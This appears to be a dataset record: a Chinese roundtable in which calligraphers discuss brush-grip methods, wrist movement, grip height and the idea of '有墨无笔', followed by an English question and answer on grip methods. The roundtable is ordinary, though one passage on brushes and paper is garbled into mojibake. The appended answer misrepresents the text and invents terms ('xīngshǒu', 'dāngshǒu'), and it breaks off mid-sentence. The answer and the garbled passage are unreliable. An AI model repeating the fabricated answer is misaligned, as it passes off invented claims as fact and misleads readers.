不同的执笔方法,都是历史上某种书写方式的遗留,都有其正确的一面,都可以作为我们在不同的书写层面创作作品的执笔方法。然而,古往今来,许多书家不了解执笔方法与书写面之间的关系,不敢理直气壮地强调双苞法是桌面书写时最正确的执笔法,或者不加分析地全盘否定单苞法和撮管法,结果妨碍了在不同书写面上的自由创作。更有甚者,有人看到出土文物上古人执简而书的图例,就盲目地奉单苞法为晋人古法,不顾书写面的历史变化,照搬照套,用来作为桌面上书写的方法,结果造成许多创作上的毛病。如:书法的点画强调入木三分,力透纸背,而单苞法的笔管倾斜,与水平的书写面不是垂直的,运笔的提按动作稍微大一些,笔锋就会偃卧偏侧。力学原理告诉我们,作用力如果垂直于作用面,那么它就会全部体现在作用面上,如果作用力与作用面成45°,那么它就有一半被浪费了。在书写中,笔杆与书写面所构成的偏侧夹角越小,接触面越大,笔锋对纸面的作用力就越小,点画的力感就越差。偃卧的用笔靠笔肚与纸面接触,墨色是擦出来的,色薄而淡,没有注入感,没有厚度。而且,笔杆与书写面不是垂直的,笔锋偃卧,运笔就无法提按顿挫,更不能逆折绞转,写不出丰富多变的点画形式和强烈鲜明的节奏感。 邵岩:我写字,通常坐着用五指执笔,站着用三指执笔,用大笔写大字就用���管抓笔。我从事现代书法、汉字艺术创作就很难具体说清是用哪一种执笔方法来完成的,以上执笔方法有时也互用,更多的时候因为注意力不在执笔方法上,具体用的是哪一种执笔方法,未记录过、也未总结过。 洪厚甜:我通常采用的都是五指执笔法:擫、押、钩、格、抵。没有用三指执笔法。传说苏东坡用三指执笔法,就像执铅笔一样。三指与五指执笔,我觉得都不重要,但执笔方法的核心是掌不能竖,掌一竖,整个手就紧张了,指挥调度就不灵活了,所以千万不能掌竖,我主张的执笔方法是:指实、掌虚、腕平、臂开,这是我执笔的原则,在这个原则下,我认为三指、五指执笔都可以。抓笔满握,通常用的都是大笔,用大毛笔写大字,通常用此法。 刘灿铭:五指执笔:即执笔中所用的\"擫、押、钩、格、抵\"五字来执笔。沈尹默先生对五字作了比较具体的解释,擫说明大指的用场,押说明食指的用场,钩说明中指的用场,格说明无名指的用场,抵说明小指的用场。五指执笔就是将这五个字结合在一起,笔管被它们包裹得很紧,除小指贴在无名指下面,其余四指都要实实在在地贴住笔管。这里的\"实\"不能理解为结实的\"实\"。五指执笔宜于平衡笔管,使笔管垂直于纸面,保持中锋行笔。五指执笔是目前最佳的执笔方法,但初学者容易机械理解,抓管太紧,有时显得不够自然。 三指执笔:指用大拇指之端斜着朝上顶住笔管,食指与中指之端朝下排列,对住大拇指,执住笔管。有点像执硬笔的方法,初学者易把握,但存在手掌不虚、虎口密封、不易平衡等缺点,故少有人用此法。 握管抓笔:指五指一齐抓住笔管。此执笔主要用于拿大笔写大字用,大笔笔管太粗,五指、三指已无法握住,用此法才能使得动。但由于握笔太死,使笔不灵活等缺点,除写大字外,多不应用。 其他的执笔法,只要适合自己的生理习惯,在不违反自然书写规律的情况下,能够自然舒适的进行书写,也是可以采用的。在创作中,我一般采用五指执笔法,但写一米左右的大字时,采用握管抓笔法。 韦斯琴:如何执笔,属于个人习惯。有人用五指执笔,有人以三指执笔,只要写得顺,没有什么不可以。我用五指执笔,写钢笔字才用三指执笔。 王义军:大抵执笔方法于书写,只是一种手段,并不存在唯一标准。有一些朋友,对执笔非常执迷,总想找到一种最好最科学的方式,但这样的\"科学\"精神已经泛滥得不科学了。老子说\"无执,故无失\",执迷于寻求唯一标准是不必的,何况对于艺术,唯一根本不存在,只需遵循基本准则即可。 基本准则是一个宽泛的规定,不复杂、不僵化。我想苏东坡对于执笔\"虚而宽\"的要求,就是一个适用的基本准则。握管抓笔不虚不宽,当不可取,历代也少有人运用。我平日用的是五指执笔,三指执笔方式未曾尝试,没有书写体验,优劣不敢臆测。我认为,方式上少许的差别无关紧要,执笔之事不必过于深究,只要书写灵便自然,能够做到\"虚而宽\"即可。何绍基用那样别扭的\"回腕法\"执笔,还能达到一种书写的高度,我们是否也可以将执笔看淡一点？ 二、执笔方法与所书写的书体、字的大小、艺术效果有无直接关联？ 马世晓:执笔方法复杂多样,其书写的合理性、科学性不尽相同,差异较大,各种执笔方法对书写的影响难以一概而论。大体说来,只要不违背人的生理固有机能,不徒求形式,旨在于运笔灵活、指挥如愿,有利于字的力、势、神、韵的生成和发挥。任何执笔方法,对于所书写书体的大小、艺术效果并无直接关联,不同的执笔方法,运用娴熟之后,也可熟能生巧、出神入化,都能写出高水准的作品。 但凡事都有例外,有的执笔方法却严重地违反人的生理习惯。如\"回腕法\"(前已述),左右运笔十分不便。再如所谓的\"龙眼\"、\"凤眼\"二法(执法从略)追求执笔美观,但手腕僵硬、不够灵活便捷。还有专为\"运指\"而创立的执笔法,名气大,且古老,名曰\"拨镫法\",显然不便于运腕,很受局限。上述四种执笔方法,均不宜采用。 各种执笔方法都有执笔的高低和布指、疏密的问题,这与书写的稳定性和灵活性有关,亦需根据所书的书体、字的大小灵活掌握。各种执笔方法在书写的过程中也都与腕法(枕腕、提腕、悬腕)密切相关,需要根据所写字的大小灵活使用腕法,三种腕法都存在不同的书写灵活性和稳定性。 其实,无论书写哪种书体,抑或字的大小(除蝇头小楷之外)皆需悬腕。腕肘一悬,顿觉周身之力自可通过肩、肘、腕、指,达于毫端,气势亦觉顺畅通利。\"悬腕\"可以说是书写动作的一种解放,臂肘脱离了桌案的约束之后,挥写活动的空间范围、提按的幅度以及笔势的变化都趋于无限了。功力精熟后,笔势迅疾,不违法度,古人的折钗股、屋漏痕、拆壁之境,可见于笔墨间,纵横挥洒、无不如意。有志于学书的人多掌握了悬腕技法,当下许多青年书家都能熟练地运用悬腕创作,这是学书的基本功之一,掌握了就终生受用不尽。悬腕挥洒的高度自由,给书写的稳定性提出了更高的要求。写大字行草尤其是大草,要达到纵横精严、速而法备的境界,除功夫精熟外,书写的稳定性亦是关键,这就要求在执笔上握管要相对低一些(离笔头约一寸左右),笔下才能稳定沉劲。林散之先生作草书,执笔甚低。大抵悬腕总要以低执管为宜。悬腕亦是运腕的关键。创作要求心、身、腕、指、笔之间高度协调,其中\"心\"与\"腕\"的交相呼应尤为关键,即以手腕运笔,亦即\"运腕\"。粗略地说,执笔在指,运笔在腕；执之欲紧,运之欲活；大抵要腕灵笔活,作品才能有生命活力。 我一向认为运指不如运腕,大体说来,应以运腕为主,运指为辅,腕指并用,配合无间。运腕无论从力量、控制能力、活动空间范围、笔势变化等都明显地大于运指。而在用笔的精微变化上,运腕动作要比运指显得细腻柔和,而运指则粗放生硬些。显然,此点对创作而言意义深远,所谓\"致广大,尽精微\"。艺术是广大与精微的辩证统一,不能精微,就难以广大,故古来书家多讲究运腕。我赞成\"用腕必灵\"、\"用笔之法在乎心使腕运\"等主运腕之论,不认同执于运腕一端而排斥运指之说,如\"不可以指运笔\"、\"指死腕活\"、\"满壁纵横腕中来\"等绝对化、过分夸大运腕的主张。同样对于主运指之说,如\"指除执外当主运笔\"、\"使指运而腕不知\"等,本人概不敢苟同。运腕、运指之说,自宋以来,历代书家主张不尽相同,从未停止过争论,这是很自然的事。当代书法界在这一问题上似乎久未谈及,反倒觉得不够自然了。 丁申阳:五指执笔法和三指执笔法在书写一般大小的各类书体时并无关系,都可以表现想要表现的东西。只是习惯问题,如果没写好,是因为没掌握好技巧才写不到位。最根本的是\"笔法\"的运用,笔法控制点画提按。提按没掌握,写出来的字便没有生气,线条就没有变化,容易成为\"奴书\"。 我认为握笔高低对字的艺术效果会有影响,如以长锋羊毫写草书就应把笔握高些,线条会在不经意间达到意想不到的艺术效果。书法创作不是设计,不必事先约定哪一笔如何行走,尤其是行草书,当然也需要遵循行草书的基本书写法则。曾经看过林散之先生写字,他就是高指执笔。那时年龄小,还不懂其中奥妙。但沈尹默先生执笔较低,存世的以小字居多,他的字清新艳丽,内容多词清调雅。我佩服的另一位书画大家谢稚柳先生,握笔也低,写字从不择笔,手腕基本靠桌上,写出来的字,线条行云流水,字里行间充满情趣、富贵气。依此看来,掌握了熟练的笔墨技巧后,握笔的不同不会影响书法创作。笔法通了,哪怕是侧锋、偏锋,用笔横涂竖抹,都是有趣味的。反之,则线条僵硬、死板。 季伏昆:对这个问题,我未做过专题研究,不敢断言。我想,如果两者有所关联,恐怕是间接的,而不是直接的。至于执笔方法与书法创作艺术效果之间的关联,是一个复杂的问题,我不敢轻易作答。就此问题,却愿意举林散之先生为例,请有兴趣的同道为我释疑:1970年除夕,72岁的林散之先生去浴池洗澡,不慎跌入池��开水锅中,全身严重烫伤,经抢救保住了生命。治疗期间,其右手五个手指粘连在一起已无法写字。为了能重新执笔,林老忍痛请医生将拇指、食指与中指切开包扎。痊愈后,三个手指能勉强活动,可以执笔写字,而无名指和小拇指仍粘在一起,且弯向手心不能伸屈。遭此大劫,林老的执笔法由原来的\"五指\"变为\"三指\",而且执得更深更低。经过一段时间的锻炼,林老逐步恢复了书法创作。此后一段时间,出现了意想不到的情况,林老感觉用三指执笔写字反而比原先用五指执笔更为顺畅、得力。其草书书风也开始出现微妙变化,正如他本人所言:\"古稀之后又一变矣\"。这一变终于让他与王铎等草书大家拉开了距离。不到两年,他创作出大草《清平乐？会昌》(1973年第1期《人民中国》日文版刊出),从而进入书法创作的高峰期。但我并不认为林散之先生晚年在书法上的艺术成就主要是执笔方法的改变所带来的。他的生活经历与艺术历程,却引起我的思考:执笔方法与艺术效果之间是否存在着某种关联？ 沃兴华:要想写好字,执笔必须满足两个要求,一是保证运笔灵活,手腕手指运动自如,提按顿挫和圆转方折时都能随心所欲,不受牵掣。要做到这一点,前提是掌虚,手指与掌心之间要有空距,这个空距是手指的回环余地,同时也是手腕运转的前提。如果没有它,手指贴着掌心,也许握笔更加稳实了,但手指因此而靠死,手腕也随之僵硬,指僵腕锁,就不可能做到用笔灵活。因此古人说:\"执笔贵掌虚\",为达到这个要求,有人主张在练习时掌心放个鸡蛋,其实不必如此麻烦,只要用第一个指节去执握笔杆,掌心自然会虚。张怀瓘《六体书论》说:\"笔在指端则掌虚,运动适意,腾跃顿挫,生气在焉；笔居半(即用第二个指节去执笔)则掌实,如枢不转,掣岂自由,转运旋回,乃成棱角,笔即死矣\"。张怀瓘的话很有道理,为保证掌虚,五个手指都应该用第一个指节去握执笔管。而且,食指与中指不要分得太开,尽量并拢,与拇指相对,使握笔的力量凝聚在一个点上,这在传统书论中叫做\"指实\"和\"指齐\"。欧阳询《八诀》说:\"指齐掌虚\",虞世南《笔髓论》说:\"指实掌虚\",目的都是为了保证手指、手腕灵活。写好字,对执笔的第二个要求是保证中锋。中锋有两个好处:一是笔锋走在笔画的中间,墨水通过笔心流注到纸面,会自然地向线条的两边渗开,中间墨色略浓于两边,出现如锥画沙的立体感。二是笔锋走在笔画中间,能够在点画的起讫之处,上下左右,八面出锋,带出细挺圆劲的牵丝,产生各种微妙的变化。中锋运��是写好字的关键,而要做到中锋,执笔应当尽量使笔杆垂直于书写面。否则,笔杆与书写面倾斜,一用力提按,笔锋就偃卧了,无法保证在笔画中间运行,因此笪重光《书筏》说:\"卧腕侧管,有碍中锋。\"通过指实掌虚来保持运笔的灵活,通过笔杆与书写面的垂直来保持中锋,这是书写对执笔的两大要求,唐太宗《笔法诀》将这两大要求概括得非常全面:\"大抵腕竖则锋正(即垂直于书写面),锋正则四面势全。次指实,指实则节力均平。次虚掌,掌虚则运用便易\"。这两个要求中,垂直于书写面的问题比较复杂,因为书写面是个变数,不同时代,采用不同的书写材料,写在纸上、简上、墙上,书写面有水平的,斜的和竖的各种变化,笔杆为了保持与它们的垂直,空间角度也必须跟着变化,又会造成手指向外侧抬顶或者向内侧回钩,影响到掌心的虚实、手指与手腕的灵活程度,结果影响到握执形式,从而产生各种不同的执笔方法。 秦汉魏晋时代,书写的主要材料是简牍,它由竹木刮削而成,可以握执,书写时胸部挺直,头微俯视,为了看得更清楚,简牍最好是斜握的,顶部向上抬起,与视线大体操持垂直。20世纪60年代,江西南昌出土的西晋永宁二年(302年)对坐书写青釉瓷俑就是这种姿势。在斜面上书写,为了保证笔锋的垂直,同时保证手腕的灵活,最好的执笔方法就是韩方明在《授笔要说》中所说的单指苞管法。这种执笔方法的笔杆往外倾斜,其倾斜角度正好与倾斜的书写面垂直。由于中指、无名指和小指向外抬顶,手掌自然空虚,手指和手腕运动自如。 战国和秦汉时期,书写材料除了简牍之外,还有缯帛。汉代出现了纸张,东晋以后,纸张成为唯一的书写材料。缯帛和纸张都是软性材料,书写时不能手执,必须放在案上,书写面是水平的,为了保证笔锋的垂直和指腕的灵活,最佳的执笔方法是双苞法。双苞法与单苞法相比,区别在于将中指从笔管的内侧转移到笔管的外侧,由从内向外抬顶变为从外向内钩压,结果就使笔杆变得垂直起来,与水平的书写面成垂直状态。 汉末魏晋时期的题壁书,唐代的狂草,写在粉壁、门障和屏风上,要站着书写,如果用双指苞管法或单指苞管法,要想笔杆垂直于墙面,手掌必须竖直,这非常困难,勉强做到,也会指腕僵硬,无法运转。站着在竖面时写字,最好的执笔法是撮管法。韩方明在《授笔要说》中说:\"谓以五指撮其管末,惟大草或图障用之。\"丰坊《书诀》:\"米元章《书史》录张伯高帖语云: 忽忽兴来,五指包管。 此为题署及颠草而言。\"五指撮管与五指包管的意思相同,都是用五个手指四面包围着合撮笔管。这种执笔法既保证了书写时笔杆垂直于书写面,又保证了手指与手腕都非常灵活。 执笔的目的是为了运笔,运笔的要求一要活,二要稳。活与稳是矛盾的,往往活了,就不够稳,稳了就不够活。反映在执笔上就是高和低、紧和松。执笔的高与低,其实是运笔半径的大小,同样一个手腕的运笔动作,如果执笔高,笔端向四周的运动幅度大,笔就活。执笔低,笔端向四周的运动幅度小,笔就稳。一般来说,写楷书、分书和篆书等正体字,或追求端庄凝重的书风,执笔要低；写行书、草书或流畅奔放的书体,执笔要高。当然,各人也可以根据自己的习惯去加以调整。执笔的松与紧,与所书写的字体和书风有关。松与紧都不能走极端,走极端便会\"逾法度\",过则不及,以\"自然\"和\"听笔之所至而不逾法度\"为上乘。 邵岩:在传统书法的创作中,执笔与所书写的书体、字的大小、艺术效果有关系。但也不尽然,仅从线条质感上讲,有时用自己不熟练的执笔方法或许能写出生涩拙朴的味道来。另外,当今书家千万不要死记硬套:\"执笔先行\",精力应放在艺术效果上。选笔也好,执笔也好,行笔速度也好,只要得心应手就可以了。 洪厚甜:除了写榜书用握笔法之外,其它执笔方法都没有大的区别,三指也可以写小楷、行书、草书,只要把握指实、掌虚、腕平、臂开这个大原则,就无所谓了,但写榜书肯定是满握笔。 刘灿铭:在常规状态下,执笔方法与所书写的书体、字的大小等应无直接关联。但在写很大的字时应有不同,因为此时常规的执笔方法已无法使用。 韦斯琴:执笔方式与所书字体、字的大小、艺术效果应该是有直接关联的。因为执笔方式本身就决定了笔的使转灵活度,线条的开合度及线条的力度。而同一种执笔方式,在写大小不同的作品时,执笔的高度也有区别。大字执笔要高,使转空间大,可兼顾通篇。小字执笔要低,使转范围小,便于表达精微之处。叶恭绰先生认为:何绍基在回腕曲肘的过程中,用三指运笔,其弊在于左向之笔画无力,所以何绍基的字左撇像鼠尾。康有为正相反,笔管和笔锋向左倾斜,结果,左笔有力,右捺软弱。由此可见,执笔方法直接关系到书写中线条的线质,而线质又决定了作品的艺术效果。 王义军:我想,应该是有影响的,执笔虚,书写便畅；执笔僵,点画少活态。一般而言,指司执,腕司运,指欲死,腕欲活。沈宗骞说,指挑剔过多,则点画浮薄燥烈,是有道理的。但这只是大意,切不要绝对化。指若完全不动,使转也难灵便,要任其自然,不能过于依赖。 如写蝇头小楷,执与运就多靠指来完成,执笔也较低。写大楷时,指在执笔,运指过多、执笔过低就难免影响腕力的发挥和灵活性。真行草之间对执笔的位置也有不同要求,虞世南所谓真一、行二、草三就指出了执笔的一个基本原则。还有一些影响不在执笔处,在于臂、肘之间的挥运与配合。如写草书,偶有连绵,这时如果肘枕在桌上不移动,就很难完成。又如作斗大的字,周身姿态不能开阔便难免局促拘泥。 三、如何解释\"有墨无笔\"？ 马世晓:书法是笔和墨的艺术,笔与墨密不能分,笔以墨现、墨因笔生。所谓\"有墨无笔\"中的\"有\"和\"无\",显然不是真的关于有无的问题,而是另有所指。\"有墨无笔\"泛指那些缺乏艺术性的、见墨不见笔的作品。作书只注重外在形式,对\"用笔\"这个书法的核心问题却不甚了解,笔法粗糙。抑或根本昧于笔法,任笔为体,这种作品肤浅苍白。或指那些运用中锋能力(或功力)明显较差的书作。善用中锋者,锋开毫平,万毫齐力,墨到之处,皆有笔在。且行笔实在,笔实墨即沉,墨不会溢出点画之外(即使淡墨晕渗出点画之外,但笔法仍清晰可见),即所谓笔能摄墨者。把握不住中锋用笔,必然会出现墨之所到笔锋未到,墨多旁溢,不能见\"笔\"了。此类作品当属\"有墨无笔\"之列。再者\"有墨无笔\"之说亦多泛指作者(或作品)用笔和用墨水准的高低比较而言的。如中国画论中记载五代荆浩的话:\"吴道子画山水 有笔而无墨,项荣 有墨而无笔 \"。即指吴道子善于用笔,而项荣善于用墨。或就其个人用笔用墨的成就相比较,吴用笔高于用墨,项用墨高于用笔。 从严格的学理意义上说,\"有墨无笔\"是不能成立的,因为\"无笔\"不可能真正\"有墨\"。一则,\"书法以筋骨为先\",笔为筋骨,墨为血肉。\"无笔\"就谈不上筋骨,\"筋骨不立,血肉不能自荣\"。既然\"无笔\"(即筋骨不立),血肉(即墨)又何以自荣(\"有墨\")呢？故\"无笔\"就谈不上真正\"有墨\"了。二则,从艺术境界上看,\"多力多骨者清,无力无筋者浊\",\"无笔\"就无骨力,其作品墨韵必然不能清雅,俗就是\"无墨\"。三则,神采显于外者,必有其内在本质在起作用。书法的用笔和用墨是本于内而形于外的质与文的关系,书法艺术是以\"笔\"为质,以\"墨\"为文的。要\"有墨\"必先\"有笔\",要以笔领墨、墨以随笔,不知用笔安能用墨。精于用笔者,\"藏筋包骨,含文包质\",笔力和笔势的变化,使得墨色变化更为丰富微妙；善于用墨者,\"浓欲其活,淡欲其华\",通过巧妙用水能更丰富、更完美地体现用笔之美和无穷的意趣。故作书要\"有笔有墨\",笔墨交融,相得益彰,才能创作出高水准的书法作品来。 丁申阳:其实\"有墨无笔\"是表象,内涵��是关键。绕来绕去还是\"笔法\"的问题,书法要通过正确的用笔才能完美。应该指出的是,作品中笔没到的地方,恰恰是最该注意的。\"大雁早已飞过,天空不留痕迹\",空白处最能反映作品的内涵,是表露心灵之笔。 \"有墨无笔\"牵涉到技巧的问题,我们不能忽视技巧在作品中的分量,技巧是艺术进步的标志,很多意念是经过技巧来表现的,技巧是将晦暗带向光明的手段。二王若没有技巧,就不会有他们的书法地位,张旭、怀素若无技巧,光凭一腔情感,也不会有惊天地、泣鬼神的旷世草书佳作。欧、虞、颜、柳,苏、黄、米、蔡,他们的作品中洋溢着丰富的书写技巧,才能够书史留名。书法是审美观念加上书写技巧的叠加,审美决定的是方向、心迹。不懂书写技巧,创作时会失之偏颇。审美是学养的问题,书法要想获得成功,学养和笔墨技巧都是不容忽视的。 季伏昆:早在北宋时期,黄庭坚就批评当时有些书家\"用笔不知擒纵,故字中无笔\",并将\"字中有笔\"视为评价书法高下的重要标准。我以为,所谓\"有墨无笔\"即属于\"字中无笔\"。所谓\"字中有笔\",当指作书时无论蘸墨多少,笔锋在纸上或平动、或提按、或绞转,都应有一定的力度与角度,以使笔下的点画或具力量感、或具立体感、或具运动感、或具节奏感,而\"不可信笔\"(董其昌语)。真正的书法,其线条应是有墨有笔的。 邵岩:\"有墨无笔\"在传统书法中讲的是一种感觉,简单形象的解释是:没有方向感的墨团,为墨块所堵,见不到用笔的轨迹。在现代书法与抽象水墨里,有墨的地方一定是画面所需要的,是用笔画上去的,当然有时可以是滴上去的,它是美的组成部分,这一块就不需要有用笔的感觉,难道不见笔的这种美的组成部分,就永远不能在传统书法样式中出现？如在王铎的草书中,有时第一笔就出现了涨墨,古人都有了,我们理应大胆地用。 洪厚甜:在书法中,笔和墨的关系是很密切的。所有笔运动的记录都有赖于墨的流动,所以,纸、笔、墨是相辅相成的关系,纸是载体,墨是媒介,笔是运动者,是传递这个记录的中介,毛笔的运动有赖于墨来记录,如果没有墨,毛笔无论如何运动,纸上都不会有痕迹。那么,没有纸,墨在哪里呢？三者中,笔是人的代称,是人的心、人的手,是传递心声的运动。此过程靠墨传递到纸上去。也就是说,一切墨的记录都是人利用纸对毛笔运动过程的详实记录。这个过程,不能把墨泼在纸上而笔不上纸。所以\"有墨无笔\"这个概念,大家一定要把他理解成就是毛笔用墨涨出的那部分,也就是笔没有到,墨已经到了。是水墨交融的时候,它的饱和状态涨出去的墨。有墨无笔,它应该是个骨、肉的概念。墨涨出去,好像笔没有到,不能单纯的离开笔,去谈墨的存在,不能离开笔去洒墨、泼墨,这个时候的有墨无笔,就只能理解成它控制在毛笔运动中的水墨比较饱和的状态。而用笔的实质,是骨肉关系,只能这样来理解,有墨无笔,是不能脱离毛笔的运动去甩墨、泼墨,离开了笔,墨就没有了价值,因为他始终是个骨肉关系。实际上,笔法的核心问题应该是毛笔以什么样的运动状态而产生的结果,产生什么样的力感。如:写小篆要求线条流畅,富有弹性,线条珠圆玉润。这种线条,是利用毛笔的天然敛合力,使提按铺毫产生的内凝力,让墨在流注过程中,有个内堆的感觉,由于没有绞裹,毛笔的摩擦力相对要小,靠毛笔与纸面逆顺的角度来调节笔在纸上的摩擦力。若没有绞裹,摩擦力是有限的,快的时候顺,慢的时候逆。行笔时推着笔走,就是要让线条既流畅又厚重,核心是运动过程中产生的力量感非常重要。第二种就是朴厚、向外具有张力的、厚重的线,这种线,是由毛笔的绞裹绞转而产生的。在运动过程中,由于绞裹绞转的参与,毛笔除了内凝力以外,还有一个螺旋的、外拓的张力,更有一个与之相反的力在起作用,这种自然的力,就是我们写碑的线,是朴厚、雄强摩擦力的反映。所以,毛笔以这种运动产生的不同力感的线,才是关注的核心。它直接关注并反映线质的状态,这是我们首先要关注的。 还有一个问题需要关注,就是执笔的高低。执笔的高低比执笔的形态(五指执笔法、三指执笔法)还要关键,我主张低执管。为何不主张高执管？因为高执管往往有一种摆脱不掉的让毛笔运动下去的趋势,存在挑、扭的小动作。而低执管可以迅速让我们忘掉毛笔。一位真正的、高素质的书法家在创作中,其书写时手中是不会感到有毛笔的存在,是人笔合一的。就像眨眼的时候没有感觉到眼皮的存在、说话的时候没有感觉到舌头的存在、走路的时候没有感觉到脚的存在,毛笔是忘掉的。也就是忘掉毛笔,心直达纸上,这在执笔中极为关键,直接关系到我们对毛笔的驾驭能力。如果还要深入对水墨进行讨论,也就是通常所说的书写时墨都调得比较均匀,没有渗入过多墨本身的渗化。实际上,往一个更高的创作层次走的时候,水墨的变化是很核心的问题,墨色变化能够产生一种纵深的审美层次。当然,你说没有水的参与,也能产生枯、浓。但层次不丰富,而且没有水所参与的墨色,焦润之间的层次出不来。所以,水与墨交融后,墨就活了,而且由于笔的翻转状态不同,会有很多偶然的变化。作为一个优秀的书家,就要下意识地统摄这种变化、调度这种变化、利用这种变化、生发这种变化。 水的运用,不外乎几种情况:一是先蘸水后蘸墨、一是先蘸墨后蘸水、一是边醮水边蘸墨；一是在书写过程中只蘸水不蘸墨、还有在书写过程中只蘸墨不蘸水。有了这几种情况,其随机性就出来了,在这个过程中,我们调节墨色的手段有很多。只要你有整合的能力,有墨与水的参与,变化就丰富了。越是变化大的,统摄的难度就越大。字越小,墨变化的幅度越轻；字越大,水墨的参与变化就越大。纸张对墨色的变化也很重要,淡墨在熟纸上就有很多变化,如董其昌就是在熟纸上使用淡墨的。他的笔、墨特别好,用的松烟墨,虽然淡,却很亮,显得虚而有禅意。如写榜书,对水墨的渗化效果要求很高,要用生宣,让水很有感应,能迅速的产生渗化的效果。所以,纸张对于笔墨,也很讲究。如写小楷或二王一系的小行书,绝对是不能用生纸的,因为生纸会将笔痕迅速划开,而宜用半生半熟的纸来写。临明清王铎的字,反而要用生宣。毛笔的软硬也很重要。如写汉碑,最好用加健羊毫；写篆书也不要用狼毫,因为狼毫的偶然性太少。写二王,笔不能太软,因为它有下意识的动作,要充分运用毛笔在纸上的反弹力来表现很多精微的东西。如写米芾,如果笔太软,弹性就保证不了。写赵孟睢⑽尼缑鳌⒄灾宦返淖郑蟊视薪锨康牡裕灰玻窬涂梢粤耍诮鲜斓闹缴霞锹季⒌亩鳌h缬萌砗列疵总溃糜埠列春罕蘼酃ατ卸嗬骱γ己苣驯硐殖鲆帐跣чa俦弥谐し妫灰颂郑灿信既恍ч芄话驯陌卟抵矢斜硐殖隼矗创笞彩恰k裕恐质樘逶擞玫墓ぞ折⒉捎玫恼路ǎ际窍嗪粝嘤φ摹 在书法创作中,如果这一块没有掌握好,空有再高的学问,都没有办法将自己的审美理想传达出来。所以,只要运用好各种书写工具、物质载体,书家的审美情趣、理想才能得到充分表达。 刘灿铭:石涛说:\"古之人有有笔有墨者,亦有有笔无墨者,亦有有墨无笔者。非山川之限于一偏,而人之赋受不齐也。墨之溅笔也以灵,笔之运墨也以神。墨非蒙养不灵,笔非生活不神。能受蒙养之灵,而不解生活之神,是有墨无笔也。能受生活之神,而不变蒙养之灵,是有笔无墨也。\"中国画中有有笔有墨、有笔无墨、有墨无笔等,书法亦同理。\"有墨无笔\"石涛已作解释,他认为墨没有智慧修养是不会产生灵性的,笔没有智慧效验是不会神化的。能表现传达智慧修养的灵性,却又缺乏生活实践的精神,这样的画,便是有墨无笔。这是石涛对笔墨精神层面的理解。如果我们还原其技法层面,其有无不能从本义去理解,应该是书法的用笔、用墨的技法功力的够与不够,好与不好。 在书法界,一直存在着笔墨之争,我以为有墨有笔最好。笔为骨,墨为肉,所谓笔中有墨,墨中有笔,在用笔中体现墨气,在运墨中见笔势。因而论及用笔,必论用墨,墨法之妙,全以笔出,二者须兼得,且要化出一种极其自然和谐的笔墨技巧。 韦斯琴:所谓\"有墨无笔\",应该是指笔路不清晰,使转含混不清。像米芾、王铎的作品中,常有涨墨出现,但却笔路清晰,用笔爽利,涨而有形,反而成为通篇的画眼。 王义军:有墨无笔,多由笔力不济所致,其点画漫漶而无筋骨,徒见墨形,不见骨力。张怀瓘《评书药石论》提到,凡书\"皆欲骨肉相称,神貌洽然\",这便是有墨有笔的境界。若\"筋骨不任其脂肉...在书为墨猪\",便是有墨无笔。与有墨无笔相对的是有笔无墨,徒逞蛮力,干枯露骨而无血肉,这种情况也很多见,\"理须裹之以皮肉,若露筋骨,是乃病也\"。严格来说,笔墨相生,无笔一定无墨,无墨亦多无笔,笔墨相生相存。故笔墨往往兼论,两概念分说,在绘画上常有,在书法上,只为表述方便而已。黄宾虹论画,说要混容中见分明,分明中见混容,书法的笔墨关系,我想道理也是相同的。 笔是筋骨,墨是血肉,无笔则不立,无墨则不生。就笔而言,一则在于起收及点画形态,一则在于与纸面相争之力(提按),前者指平面之形,后者指纵深之力。此力用周小英先生的比喻是手术刀之力而非屠夫之力,不在于劲猛,而在于恰到好处。速度也要不缓不急,欧阳询认为\"缓则骨痴\",虞世南也说\"太缓而无筋,太急而无骨\"。 墨,一则在于由运笔所生成的血、肉,求其调和,求其鼓荡丰润,这一层是用墨的本质,试看北宋以前,凡大家之作,其点画无不雍容和润,笔墨相生。此间偶有例外如《自叙帖》者,有笔无墨,我以为它绝非大家手笔,其理由即在此。此后除赵松雪偶有合作之外,世人无不失于偏颇,或复杂啰嗦,涣散靡软,或简单直白,筋骨外露,皆不得自然。墨的另一层,是浓淡枯湿,比较直观,容易理解,当代人对此也多有留意。但这种追求有时也很让人担忧,浓淡枯湿过于表面化,对书法中更重要的内容-笔势是一种伤害。 四、笔法是一个复杂的理论问题,在运用中其理论与实践有何关联？ 王义军:理论和实践,在古人那里多是相通的,而当今的现状则各行其是。关于笔法,如今作为理论的解剖和作为实践的书写是两回事,所谓\"能行之者未必能言,能言之者未必能行\"。实践中简洁自然的笔法,生成丰富多变的点画,理论上冗繁深邃的笔法指向模式单一的线条。这就像生活中对事物的认识,比如什么是杯子,只要看几个就自然有了判断,并不需要概念、定义来界定说明,而理论概念一旦给出,材质、形状、大小、功能等都有了局限,成见便由此生成。于是,什么是杯子,什么不是,就真的成了问题。直观的经验是在实践中逐步获得的,开放、变通、毫无成见,在艺术教学中往往更为可靠。对书法来说,就是多看经典作品,获得一种眼光,用现在通行的西式语言,叫视觉经验。有了这种眼光,来揣摩用笔的道理,往往比语言文字可靠。 接下来的问题是,怎么把这个眼光在手上体现出来？这就出现了我们通常所说的眼高手低的问题。眼高手低本是自然的,只要不断地按照眼的指导让手一步一步也高起来便是了。但事实往往不是这么简单,这眼高有着书者和鉴赏者的两种类型。张怀瓘说:\"古之名手,但能其事,不能言其意。今仆虽不能其事,而辄言其意。\"这个\"意\"是理论家可以言的,要指导实践,光是\"意\"还远远不够,甚至不能言其意,也可以能其事。书者的眼高要指向实践,就必须落实到书写技巧上,落实到笔法上,鉴赏者则不必如此。所以对于书者而言,笔法技巧的这一部分就显得尤为重要。否则,不知其所以然地书写,就会徒费年月。 笔法用文字来表达有很多困难,也难说透彻。简单地说就是调锋,具体体现在起、行、收上,起笔蓄势(此后每起笔只需承接前一笔之势),铺毫中锋,行笔须注意与纸面的相争之力,收笔收束,笔锋复使其归中,并蓄下一笔之势。此间最重要的是\"提按\"二字,铺毫、行笔、转折(顿挫)、收束无一处可以割舍开来。古代将笔法说得很神秘,是因为信息不发达。如今只要当面看一下示范,动动笔,三言两语便能基本了解。了解之后,放下执迷,将\"眼光\"落实到笔下,便是各人用功的事了。", "question": " What is the \"grip method\" in calligraphy and how is it used to write different sizes of Chinese characters?", "answer": "\n        In Chinese calligraphy, \"grip method\" refers to the way the writer holds the brush. Different grip methods are used to write different sizes of Chinese characters. For example, for small characters like xīngshǒu, the writer uses a firm grip to control the brush. For larger characters like dāngshǒu, the writer uses a looser grip to allow more movement of the brush. So the grip method 